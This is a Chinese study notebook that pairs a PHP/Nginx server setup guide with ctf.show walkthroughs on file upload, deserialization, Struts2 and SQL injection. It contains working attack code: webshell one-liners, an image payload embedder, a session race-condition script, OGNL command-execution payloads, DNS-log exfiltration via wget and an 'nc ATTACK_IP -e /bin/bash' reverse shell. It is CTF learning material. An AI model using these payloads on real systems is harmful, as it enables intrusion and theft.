---
title: "搭建服务器"
lastmod: 2026-06-02T22:23:31+08:00
draft: false
---
```bash
if [ -f /usr/bin/curl ];then curl -sSO https://download.bt.cn/install/install_panel.sh;else wget -O install_panel.sh https://download.bt.cn/install/install_panel.sh;fi;bash install_panel.sh ssl251104
```

宝塔直接搭

## 1) 安装 Nginx + PHP-FPM（推荐）

```plain
sudo apt update
sudo apt install -y nginx php-fpm php-cli php-curl php-mbstring php-xml php-zip
```

启动并设置开机自启：

```plain
sudo systemctl enable --now nginx
sudo systemctl enable --now php*-fpm
```

确认服务状态：

```plain
systemctl status nginx --no-pager
systemctl status php*-fpm --no-pager
```

***

## 2) 找到 PHP-FPM 的 socket 路径（避免版本不一致踩坑）

不同 Ubuntu 版本 PHP 版本不一样（比如 20.04 常见 7.4；22.04 常见 8.1），Nginx 配置里要填对 socket。

直接列出来：

```plain
ls -l /run/php/
```

你会看到类似：

* `php7.4-fpm.sock`
* `php8.1-fpm.sock`
* `php8.2-fpm.sock`

记住那个 `phpX.Y-fpm.sock` 的名字，后面要用。

***

## 3) 准备一个网站目录 + 测试 PHP 文件

```plain
sudo mkdir -p /var/www/1
sudo chown -R $USER:$USER /var/www/1
```

创建首页：

```plain
cat > /var/www/1/index.php <<'EOF'
<?php
echo "OK, PHP is working.\n";
phpinfo();
EOF
```

上线后建议删掉 `phpinfo()`（信息泄露），先测试用没问题。

***

## 4) 配 Nginx 站点（支持 PHP）

创建站点配置文件：

```plain
sudo tee /etc/nginx/sites-available/demo >/dev/null <<'EOF'
server {
    listen 80;
    server_name _;

    root /var/www/1;
    index index.php index.html;

    location / {
        try_files $uri $uri/ /index.php?$query_string;
    }

    location ~ \.php$ {
        include snippets/fastcgi-php.conf;

        fastcgi_pass unix:/run/php/php8.1-fpm.sock;
    }

    location ~ /\. {
        deny all;
    }
}
EOF
```

把上面这一行改成你机器真实的（根据第 2 步 `ls /run/php/`）：

```plain
fastcgi_pass unix:/run/php/php8.1-fpm.sock;
```

启用站点并重载：

```plain
sudo ln -sf /etc/nginx/sites-available/1 /etc/nginx/sites-enabled/1
sudo rm -f /etc/nginx/sites-enabled/default

sudo nginx -t
sudo systemctl reload nginx
```

***

## 5) 验证访问

本机验证：

```plain
curl -i http://127.0.0.1/
```

如果服务器有公网 IP，也可以：

```plain
curl -i http://YOUR_SERVER_IP/
```

看到 `OK, PHP is working.` 或 phpinfo 页面，就说明通了。

# 文件上传
注意windows的ntfs流，可以通过::$DATA绕过

## 153

![1760265551681-6b8b4759-2bec-4e7f-b17b-4b33776b442d.png](./img/CnfOBJ-v8acdaBX2/1760265551681-6b8b4759-2bec-4e7f-b17b-4b33776b442d-811690.png)

直接告诉你后端有检验

先上传一个php尝试一下

![1760265757293-90670006-6483-4ba3-8b4c-9410d03e7097.png](./img/CnfOBJ-v8acdaBX2/1760265757293-90670006-6483-4ba3-8b4c-9410d03e7097-311942.png)

直接上传不上去

![1760265820023-36cff214-6eba-4975-a647-9289062e2cf6.png](./img/CnfOBJ-v8acdaBX2/1760265820023-36cff214-6eba-4975-a647-9289062e2cf6-595618.png)

把前端代码改成php，看看行不行

![1760265865709-12c10a1c-0354-49a1-adc4-30d65be8b698.png](./img/CnfOBJ-v8acdaBX2/1760265865709-12c10a1c-0354-49a1-adc4-30d65be8b698-961542.png)

上传失败了，说明后端存在检验\
![1760265994531-5c2f353a-afa4-4437-a5f8-eb876cd562ff.png](./img/CnfOBJ-v8acdaBX2/1760265994531-5c2f353a-afa4-4437-a5f8-eb876cd562ff-997811.png)\
上传一下，说明png格式也不行，继续尝试

是不是对文件前缀有检测，找一个png头

01editor打开一个png

![1760266094129-645b8966-9dce-4412-9334-147f56da0877.png](./img/CnfOBJ-v8acdaBX2/1760266094129-645b8966-9dce-4412-9334-147f56da0877-686851.png)

复制一下前缀，再次输入

![1760266163422-b9d506e8-0438-4c94-a2aa-c2236a574df4.png](./img/CnfOBJ-v8acdaBX2/1760266163422-b9d506e8-0438-4c94-a2aa-c2236a574df4-475407.png)

还是不行。。。

是不是对hex没有复制进去？

png前缀是前四个，继续更新

![1760266254489-e466f65d-6470-4d45-8815-453d2aa1505a.png](./img/CnfOBJ-v8acdaBX2/1760266254489-e466f65d-6470-4d45-8815-453d2aa1505a-304701.png)\
保持png的前缀一样，再次尝试

![1760266473431-5f569f50-965b-4653-a2ae-56e87c0d262c.png](./img/CnfOBJ-v8acdaBX2/1760266473431-5f569f50-965b-4653-a2ae-56e87c0d262c-158841.png)

复制进去，回显变了，但是没成功，看起来前缀是8个字符

直接送一个png进去看看区别在哪里

![1760266690431-f7510788-7fff-484b-ade1-ed3bca5cd15c.png](./img/CnfOBJ-v8acdaBX2/1760266690431-f7510788-7fff-484b-ade1-ed3bca5cd15c-061400.png)

发送成功，尝试一下后缀能不能控制

后缀改成php试一试，发现不行

![1760266768133-843e3a77-c7e1-492b-aeb8-19d100814cdb.png](./img/CnfOBJ-v8acdaBX2/1760266768133-843e3a77-c7e1-492b-aeb8-19d100814cdb-225520.png)

再次尝试中断能不能成功

![1760266821356-fee5741f-8325-4466-be1c-e79bf64f7f7b.png](./img/CnfOBJ-v8acdaBX2/1760266821356-fee5741f-8325-4466-be1c-e79bf64f7f7b-392027.png)

php和png中间加一个hex为0的值，发现还是不行

尝试一下后缀为phP

![1760266868356-13b88736-dd70-4c64-99ce-269f3468b5e7.png](./img/CnfOBJ-v8acdaBX2/1760266868356-13b88736-dd70-4c64-99ce-269f3468b5e7-334021.png)

成功，但是不能解析

![1760266922013-1df86504-dfd1-4977-8cb9-96a5c98ad66e.png](./img/CnfOBJ-v8acdaBX2/1760266922013-1df86504-dfd1-4977-8cb9-96a5c98ad66e-354828.png)

发现/upload也能打开，而且有值，看眼为什么

![1760267021196-84003ae7-9b6d-4fbc-ae6d-0ba0f35df69e.png](./img/CnfOBJ-v8acdaBX2/1760267021196-84003ae7-9b6d-4fbc-ae6d-0ba0f35df69e-732215.png)

发现php存在一个配置文件.user.ini，在当前目录下存在php文件的时候会触发，出发间隔为300秒

![1760267163856-dd272907-4ab6-4bc0-b673-4a666e6234f7.png](./img/CnfOBJ-v8acdaBX2/1760267163856-dd272907-4ab6-4bc0-b673-4a666e6234f7-441514.png)

查看ini文件，发现有文件包含的函数可以使用

只需要写一个ini文件保存为.user.ini

```cpp
auto_append_file=upload/f3ccdd27d2000e3f9255a7e3e2c48800.jpg
```

直接上传一个ini文件即可，查看网站源代码：

```cpp
layui.use('upload', function(){
  var upload = layui.upload;
   
  //执行实例
  var uploadInst = upload.render({
    elem: '#upload' //绑定元素
    ,url: '/upload/' //上传接口
    ,done: function(res){
    	if(res.code==0){
    		$("#result").html("文件上传成功，路径："+res.msg);
    	}else{
    		$("#result").html("文件上传失败，失败原因："+res.msg);
    	}
      
    }
    ,error: function(){
      $("#result").html("文件上传失败");
    }
  });
});
```

看到没有限制，说明前端的限制过了就行

![1760267458953-720931ac-b268-42be-a59f-0942b0ab12ee.png](./img/CnfOBJ-v8acdaBX2/1760267458953-720931ac-b268-42be-a59f-0942b0ab12ee-976691.png)

直接删去png限制

![1760267533034-04f8cd62-299e-4e9e-ab86-fbce1423d517.png](./img/CnfOBJ-v8acdaBX2/1760267533034-04f8cd62-299e-4e9e-ab86-fbce1423d517-699668.png)

上传失败，将Content-Type改成image/png![1760267569418-2581fb13-1c82-4f19-baae-7d8df7f0758e.png](./img/CnfOBJ-v8acdaBX2/1760267569418-2581fb13-1c82-4f19-baae-7d8df7f0758e-911059.png)

上传成功

直接传一个1.txt上去

![1760267659700-dc84ba13-3e37-4fa4-82e2-353f915d8f75.png](./img/CnfOBJ-v8acdaBX2/1760267659700-dc84ba13-3e37-4fa4-82e2-353f915d8f75-062900.png)

访问/upload，即ini配置生效的地方

会卡一下，重新加载ini文件,实在不行重新开一下靶场

![1760268646027-45a215c5-ad9a-431f-bc9a-67b2f51c2c7a.png](./img/CnfOBJ-v8acdaBX2/1760268646027-45a215c5-ad9a-431f-bc9a-67b2f51c2c7a-671521.png)

注入成功，下班

## 154

直接抄上一题，发现.user.ini可以注入，但是txt注入不成功

那就改前缀

改完前缀发现能注入，但是加上php代码就注入不了了

![1760271248050-afef34a1-5df1-41ff-b7e5-30ebda7e6f71.png](./img/CnfOBJ-v8acdaBX2/1760271248050-afef34a1-5df1-41ff-b7e5-30ebda7e6f71-370409.png)

只写php三个字，发现也不行

phP可以注入，那就使用php的短标签

### <font style="color:rgb(0, 0, 0);">1. 基本短标签形式</font>

最常见的短标签是 `<?` 和 `?>`，用于替代标准的 `<?php` 和 `?>`：

**php**

```php
<?
echo "这是使用短标签的PHP代码";
?>
```

### <font style="color:rgb(0, 0, 0);">2. 输出短标签</font>

还有一种专门用于输出变量或表达式的短标签 `<?=`，它等价于 `<?php echo`：

**php**

```php
<?= $variable ?>
<?= "Hello, World!" ?>
```

## 155

同上，主要是对文件类型进行检测（Content-Type）

## 156

过滤方括号（\[]），直接用大括号代替就行，其他同上

## 157

过滤；，但是众所周知php中最后一个分号是不需要加的，所以直接写就是了

## 158

同上

## 159

发现不让用括号，那么肯定是那几个语言结构

尝试一下日志污染能不能行

```cpp
$a='/var/lo'.'g/nginx/access.lo'.'g';//日志路径
//在log之中加上.防止被过滤
include $a
```

继续检查什么问题，发现是有一个分号，那就放在一个句子里面运行

直接UA头注入进去就行了

## 160

过滤空格，只需要先设置为1，然后在hex中间把31改成0d就可以了。

其他同上

## 161

![1760329108175-cc514338-4c51-4cc8-bc09-13f87b78435c.png](./img/CnfOBJ-v8acdaBX2/1760329108175-cc514338-4c51-4cc8-bc09-13f87b78435c-352520.png)

*正常png文件都上传不上去，你是人啊？*

绕过前端尝试jpg方式，发现也不行

有两种可能，第一种是对文件进行了二次渲染，第二种可能是进行了文件大小的判定

传入一个正常的照片，还是不行

尝试一下gif的头，发现可以注入

![1760329498821-3dd574d8-e2d9-4743-a084-ea1455f6e3bb.png](./img/CnfOBJ-v8acdaBX2/1760329498821-3dd574d8-e2d9-4743-a084-ea1455f6e3bb-349837.png)

注意头是GIF89a

*png文件，gif文件头能绕过，也是没谁了。。。*

继续之前的.user.ini上传，使用之前的日志污染，注意将include和地址之间的空格使用0d替换

蚁剑一抓结束

## 162

内容中过滤了.，只需要传入不需要点的

.user.ini之中直接删去包含的文件名称，使用不带.的文件名，之后注入的文件不需要使用.就能保存在服务器中。

一种做法是找一个网址转换为长网址，访问就会放回一行木马

正常应该是通过session访问，尝试一下

<https://www.freebuf.com/vuls/202819.html>

发现.user.ini中要求包含的文件必须是静态文件，但是变量是动态的，所以不能包含，但是在调用后使用文件可以使用

过滤了以下内容

```cpp
.  [  {  (  
```

确定了以后就可以确定1中的内容是什么了

```cpp
<?=include "/tmp/session"?>
```

session储存在/tep/sess\_\*\*\*中

\*\*\*为session名字

```cpp
import requests
import threading
session=requests.session()
sess='yu22x'
url1="http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/"
url2="http://f275f432-9203-4050-99ad-a185d3b6f466.chall.ctf.show/upload"
data1={
	'PHP_SESSION_UPLOAD_PROGRESS':'<?php system("tac ../f*");?>'
}
file={
	'file':'yu22x'
}
cookies={
	'PHPSESSID': sess
}

def write():
	while True:
		r = session.post(url1,data=data1,files=file,cookies=cookies)
def read():
	while True:
		r = session.get(url2)
		if 'flag' in r.text:
			print(r.text)
			
threads = [threading.Thread(target=write),
       threading.Thread(target=read)]
for t in threads:
	t.start()

```

## 163

同上，但是上传的1会秒删

## 164

直接给一个代码方便注入

```cpp
<?php
$p = array(
    0xa3,
    0x9f,
    0x67,
    0xf7,
    0x0e,
    0x93,
    0x1b,
    0x23,
    0xbe,
    0x2c,
    0x8a,
    0xd0,
    0x80,
    0xf9,
    0xe1,
    0xae,
    0x22,
    0xf6,
    0xd9,
    0x43,
    0x5d,
    0xfb,
    0xae,
    0xcc,
    0x5a,
    0x01,
    0xdc,
    0x5a,
    0x01,
    0xdc,
    0xa3,
    0x9f,
    0x67,
    0xa5,
    0xbe,
    0x5f,
    0x76,
    0x74,
    0x5a,
    0x4c,
    0xa1,
    0x3f,
    0x7a,
    0xbf,
    0x30,
    0x6b,
    0x88,
    0x2d,
    0x60,
    0x65,
    0x7d,
    0x52,
    0x9d,
    0xad,
    0x88,
    0xa1,
    0x66,
    0x44,
    0x50,
    0x33
);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
    $r = $p[$y];
    $g = $p[$y + 1];
    $b = $p[$y + 2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img, '3.png');  //要修改的图片的路径
/* 木马内容
<?$_GET[0]($_POST[1]);?>
 */

?>
```

它可以伪装一个png方便注入

到时候直接注入就行，获取回显把png下载下来就行

## 165

png直接上传不上去了。。。

上传一个jpg，发现有一行代码：

CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), default quality

![1760346408341-8b7b7942-770a-4a23-95ab-1750cd0a22c1.png](./img/CnfOBJ-v8acdaBX2/1760346408341-8b7b7942-770a-4a23-95ab-1750cd0a22c1-196198.png)

说明进行了jpg的二次渲染

```cpp
<?php
    $miniPayload = "<?php system('tac f*');?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
用法  php exp.php a.png

```

主要问题是找一个png能运行出来的，问题是我找不到。。。

*难受*

*成功率感人啊*

## 166

要我们上传zip格式，但是返回的是text/html格式

有可能是文件包含

直接在zip文件最后加上代码就可以注入

## 167

有个奇怪的提示httpd

说明上传htaccess文件

<code>_<font style="color:rgba(0, 0, 0, 0.85);">.htaccess</font>_</code>*<font style="color:rgba(0, 0, 0, 0.85);background-color:rgb(249, 250, 251);"> 是一个用于配置 Web 服务器（主要是 Apache）的</font>\_\_**<font style="background-color:rgb(249, 250, 251);">分布式配置文件</font>***

*<font style="color:rgba(0, 0, 0, 0.85);background-color:rgb(249, 250, 251);">允许网站开发者在不修改服务器主配置文件（如</font>*<code>_<font style="color:rgba(0, 0, 0, 0.85);">httpd.conf</font>_</code>*<font style="color:rgba(0, 0, 0, 0.85);background-color:rgb(249, 250, 251);">）的情况下，对特定目录（及子目录）的服务器行为进行自定义设置。</font>*

<font style="color:rgba(0, 0, 0, 0.85);background-color:rgb(249, 250, 251);">看眼源代码，发现能上传jpg文件</font>

![1760351038829-c8d6de8d-53f2-412e-b5f9-8321ab95d033.png](./img/CnfOBJ-v8acdaBX2/1760351038829-c8d6de8d-53f2-412e-b5f9-8321ab95d033-560661.png)

同样的方法，更改前端抓上传的包

同样的，更改content-type为image/jpeg

先上传一个.htaccess文件

```cpp
AddType application/x-httpd-php .jpg
```

这个文件的意思是将所有的jpg文件当成php解析

上传刚才的二次渲染的文件，注入成功

## 168

看眼源代码，发现可以上传png

上传随便一个png抓包，发现能以php的形式上传，但是访问不了，搞不清楚是删了还是没有权限

蚁剑连接，找一下flag就行

## 169

发一个随便png包，返回null

这样发包能注入，内容为空

![1760352254241-c9b613ca-b073-46e9-a7ba-465247bb0cd4.png](./img/CnfOBJ-v8acdaBX2/1760352254241-c9b613ca-b073-46e9-a7ba-465247bb0cd4-802573.png)、

过滤了<        \_  逆天\_

auto\_append\_file=php://input尝试一下也不行

*这个会在index.php文件执行过后执行POST中的源代码*

但是前提是有php文件执行

但是传入auto\_append\_file=/var/log/nginx/access.log   日志污染可以

刚才传入了一个空文件，虽然没有php代码，但是是php后缀，也会执行

所以直接传入一个index.php文件，是什么不要紧，只要传进去了就可以

网页直接传进去不行，但是BP就可以，不知道为什么

## 170

同上

# 反序列化

总思路：通过控制序列化的类方法的属性进行需要的操作

在查看自己使用的包的时候应该使用php -S localhost:8000 -c "D:\php-8.4.7-nts-Win32-vs17-x64\php.ini"

对于php内置程序进行打开

## 254

和反序列化没什么关系

## 255

新建一个相同的序列化文件输入到cookie中，因为他需要读取一个cookie，所以在vip更改为true后直接保存cookie即可

## 256

注意class内部的判断

## 257

更改class内部的函数指向，直接指向后门函数

## 258

子啊有正则判断的时候可以在序列化中加入+等字符，意义不变即可

## 259

可以使用nc对于自己的程序进行抓包来查看自己的包

使用SoapClient进行模拟上传的包，对其进行反序列化然后上传

可以控制ua和soapaction，可以对ua进行添加\r\n进行绕过

content-type使用application/x-www-form-urlencoded，表示数据为表单格式，可以对其进行修改（经常使用的POST）

HTTP\_X\_FORWARDED\_FOR是传入访问的ip，可以伪造，加在ua头中间，content-type前面

使用时写X-Forwarded\_for:127.0.0.1

## 260

字符串序列化就是他本身

## 261

当使用 unserialize() 函数反序列化对象时，\_\_unserialize() 方法会被自动调用

当使用 serialize() 函数序列化对象时，\_\_sleep() 方法会被自动调用

\_\_invoke()允许对象像函数一样被调用，增加代码的灵活性

\_\_contruct()构造函数，在对象创建时调用，可以进行一些初始化操作

\_\_destruct()析构函数，在对象销毁时调用，可以进行一些清理操作

\_\_set()设置属性时调用，可以进行一些属性的操作

\_\_get()获取属性时调用，可以进行一些属性的操作

\_\_call()调用不存在的方法时调用，可以进行一些方法的操作

\_\_wakeup()反序列化时调用，可以进行一些反序列化操作

\_\_toString()对象转字符串时调用，可以进行一些字符串的操作

\_\_clone()对象克隆时调用，可以进行一些克隆的操作

## 262

在反序列化之间有替换的时候，可以使用替换来使序列化的长度不变，但是替换后长度发生变化，在这个差值之间逃逸

注意题目中有没有@\*\*\*.php,两个网站之间的cookie公用

## 263

$\_SESSION是保存网站的全局变量的变量,通过session\_start打开。

php和php\_serialize是两种不同的处理器

php处理器输出的session的格式是键名加|加一个不加{}的序列化后的值

php\_serialize处理器输出的session的格式是序列化后的值

ini\_set('session.serialize\_handler','php\_serialize');设置 PHP 会话数据的序列化处理器为 php\_serialize

寻找cookie输入session的地方，寻找可以使用的类方法，记得确认有没有base64编码

注意到index和inc之中的处理器不一样

使用var\_dump(unserialize())来查看能不能反序列化成功

serialize（）函数在序列化后在加几个字会报错，但是并不会影响序列化结果

函数中的\_\_distruct用法并不需要有什么东西来调用他，只需要有unserialize()反序列化出了对象，他就会自动调用\_\_distruct()函数

当储存在session中的序列化被调用的时候会自动全部调用，可以反序列化

## 264

同262，注意序列化的值

## 265

可以通过&地址符将两个变量分配的内存绑定到一个地址上

## 266

file\_get\_contents('php://input')可以获取POST的原始数据，记得用application/x-www-form-urlencoded(raw)进行输入，要使用BP输入

可以通过破坏反序列化的结构但是保留类名的方式来进行判断的绕过

## 267

首先进入网页源码查看是什么框架以及判断一下是什么版本

注意get和post中的变量，可能随着页面变化的变化而变化

命令可以使用外带，通过dnslog.cn来创建网页，然后发送过去，查看结果。

shell\_exec(wget `ls \`.http:\*\*\*\*)将命令发送到服务器，结果外带到网页中

有时候输出不出来可以对shell命令加上|base64来进行编码，然后输出

shell命令可以写webshell

echo "<?php eval($_POST[1]);?>" > 1.php

有时候编码有可能出现问题，需要在shell后面跟一个phpinfo()来输入

shell命令中$ 表示对美元符号 $ 进行转义，使其失去特殊含义，仅作为普通字符 $ 处理。

pwd命令表示显示当前文件夹的路径，可以用来查看当前目录的绝对路径。

## 268

可能存在链子被过滤的情况，这种时候换一个试一试,同一个框架可能存在不同的链子

## 269

换个板子就行

## 270

wow,是全新的链子欸

## 271

是是的框架欸，但是还是直接抄链子，听不懂

## 272

还是框架，输出会被覆盖，可以通过setcookie将结果储存在cookie里面

## 273

同上

## 274

查看网页源代码，发现GET的data传参，然后发现是thinkphp5.1的框架，寻找到相应框架的链子

使用方式是data传参然后lin传shell命令

## 275

直接看源码，序列只要创建就行，并不需要运行什么就可以执行销毁函数，所以直接将命令输入进去

注意shell命令可以通过;来分割

## 276

触发phar反序列化的敏感函数：

文件相关的函数

fileatime / filectime / filemtime

stat / fileinode / fileowner / filegroup / fileperms

file / file\_get\_contents / readfile / fopen

file\_exists / is\_dir / is\_executable / is\_file

is\_link / is\_readable / is\_writeable / is\_writable

parse\_ini\_file

unlink

copy

其他触发函数

image

```
exif_thumbnail

exif_imagetype

imageloadfont

imagecreatefrom***

getimagesize

getimagesizefromstring
```

hash

```
hash_hmac_file

hash_file

hash_update_file

md5_file

sha1_file
```

file / url

```
get_meta_tags

get_headers
```

使用条件竞争进行传入phar的传入和使用同时进行，在读取phar文件的时候会反序列化

通过Phar::getMetadata()获取元数据，PHP 会自动对这些元数据进行反序列化

## 277

python里面序列化和反序列化通过pickle.dumps()和pickle.loads()进行

可以使用反弹shell将已经注入的恶意代码运行，让服务器连接自己的主机，将输入输出重定向到自己

直接反弹bash

nc ATTACK\_IP ATTACK\_PORT -e /bin/bash

# java

<https://github.com/abc123info/Struts2VulsScanTools>

这个部分的题目全是针对struts2的漏洞的，需要下载一个`Struts2Scan`来进行扫描程序的漏洞

通过 `python scan.py -h` 可查看所有参数，以下是最常用的核心参数：

| **参数** | **作用** |
| :--- | :--- |
| `-h`<br/> / `--help` | 查看帮助文档（所有参数说明，必查！） |
| `-u URL` | 扫描单个目标 URL（最常用，如 `http://xxx.com/login.action`<br/>） |
| `-f 文件名` | 批量扫描多个 URL（把目标 URL 逐行写入文本文件，如 `urls.txt`<br/>） |
| `-p 端口` | 指定端口（默认 80/443，若目标端口非默认，如 `8080`<br/>，需手动指定） |
| `-t 线程数` | 设置扫描线程（默认 5，线程越多越快，建议 5-20 之间，避免触发防护） |
| `-timeout 秒数` | 设置请求超时时间（默认 10 秒，网络差时可设为 20，如 `-timeout 20`<br/>） |
| `-proxy 代理` | 通过代理扫描（如 `http://127.0.0.1:8080`<br/>，用于穿透内网或隐藏 IP） |
| `-v` | 详细模式（显示扫描过程、漏洞详情，排错时常用） |

虽然我用不出来，但是先写上

## 279

看路径就知道是S2-001漏洞，是OGNL表达式的

OGNL表达式三个符号%, #, $的含义

%的用途是在标志的属性为字符串类型时，计算OGNL表达式%{}中的值

\#的用途访主要是访问非根对象属性，因为Struts 2中值栈被视为根对象，所以访问其他非根对象时，需要加#前缀才可以调用

$主要是在`Struts 2`配置文件中，引用`OGNL`表达式

S2-001是当用户提交表单数据且验证失败时，服务器使用OGNL表达式解析用户先前提交的参数值，`%{value}`并重新填充相应的表单数据

```javascript
%{#req=@org.apache.struts2.ServletActionContext@getRequest(),#response=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse").getWriter(),#response.println(#req.getRealPath('/')),#response.flush(),#response.close()}

// @org.apache.struts2.ServletActionContext@getRequest():
// 获取 HttpServletRequest 对象，即当前 HTTP 请求。

// #context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"):
// 获取 HttpServletResponse 对象，用于返回数据给客户端。

// #req.getRealPath('/'):
// 获取 Web 应用的根目录

// #response.println(...):
// 将根目录路径 打印 到 HTTP 响应中

// #response.flush(), #response.close():
// 刷新并关闭响应流，确保数据返回给客户端。
```

根据提示才出来答案是在环境变量中，所以在命令执行查看环境变量

```javascript
%{#a=(new java.lang.ProcessBuilder(new java.lang.String[]{"env"})).redirectErrorStream(true).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#f=#context.get("com.opensymphony.xwork2.dispatcher.HttpServletResponse"),#f.getWriter().println(new java.lang.String(#e)),#f.getWriter().flush(),#f.getWriter().close()}
```

```javascript
new java.lang.ProcessBuilder(new java.lang.String[]{“env”})
创建 ProcessBuilder 对象，执行 env 命令, 查看环境变量
redirectErrorStream(true): 让标准错误流和标准输出流合并，避免丢失错误信息。
.start(): 启动进程，执行命令。
读取 env 命令输出
#b = #a.getInputStream(): 获取进程的标准输出流。
#c = new java.io.InputStreamReader(#b): 用 InputStreamReader 读取流内容。
#d = new java.io.BufferedReader(#c): 用 BufferedReader 进行缓存读取，提高效率。
#e = new char[50000]: 分配一个 50,000 字符的缓冲区（存储 env 命令的输出）。
#d.read(#e): 读取命令的输出到 #e 数组中。
返回执行结果
#f = #context.get(“com.opensymphony.xwork2.dispatcher.HttpServletResponse”): 获取 HttpServletResponse。
#f.getWriter().println(new java.lang.String(#e)):
将 env 命令的输出转换为字符串，并通过 HTTP 响应返回给攻击者。
#f.getWriter().flush(), #f.getWriter().close():
确保数据完全写入并关闭响应。
```

也可以使用工具直接扫描，至于怎么找到扫描的文件，看源代码就行了

```javascript



<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<title>S2-001</title>
</head>
<body>
<center><h2>ctfshow login</h2>
<p><hr> 

			
<form id="login" name="login" onsubmit="return true;" action="/S2-001/login.action" method="post">
<table class="wwFormTable">
	<tr>
    <td class="tdLabel"><label for="login_username" class="label">username:</label></td>
    <td
><input type="text" name="username" value="1" id="login_username"/>
</td>
</tr>

	<tr>
    <td class="tdLabel"><label for="login_password" class="label">password:</label></td>
    <td
><input type="text" name="password" value="1" id="login_password"/>
</td>
</tr>

	<tr>
    <td colspan="2"><div align="right"><input type="submit" id="login_0" value="Submit"/>
</div></td>
</tr>

</table></form>




</body>
</html>
```

其中`action="/S2-001/login.action" method="post"`摆明了告诉我们是扫描这个文件

![1763985332047-0bddf668-cc88-4632-87ab-b29a7b06b1b0.png](./img/CnfOBJ-v8acdaBX2/1763985332047-0bddf668-cc88-4632-87ab-b29a7b06b1b0-202506.png)

## 280

还是直接扫描这个文件，发现存在漏洞S2-005，直接引用就行了

至于扫描哪一个url还是需要思考的，先看一眼有什么参数可以使用，有没有可以POST传参的东西

`https://bdcb23f5-18ea-40d7-9839-1000e78688f3.challenge.ctf.show/S2-005/example/HelloWorld.action?request_locale=en`这个url中有一个GET参数，直接加上

依旧是工具扫描出结果

## 281

依旧是扫描

看见一个网页抓包一下，发现是POST穿三个参数上去，直接吧三个参数填进去就解决了

![1763987058696-f439e43f-a07b-47b2-b6bc-ad4f5f15a5a2.png](./img/CnfOBJ-v8acdaBX2/1763987058696-f439e43f-a07b-47b2-b6bc-ad4f5f15a5a2-219608.png)

## 282

和上一道题目一样，但是我并不知道发生了什么。。。

因为告诉我是漏洞S2-008，但是我检测和使用的漏洞都是S2-016

# 代码审计

## 301

先下载一下看一下代码

注意技巧，只看php和js两种东西，查看有没有可以注入的点

发现代码中有漏洞，可以sql注入

```javascript
$username=$_POST['userid'];
$userpwd=$_POST['userpwd'];
$sql="select sds_password from sds_user where sds_username='".$username."' order by id limit 1;";
$result=$mysqli->query($sql);
$row=$result->fetch_array(MYSQLI_BOTH);
```

发现这段代码中没有检测传入的字符串，所以可以sql注入

发现可以时间盲注，直接往里面注入就行了

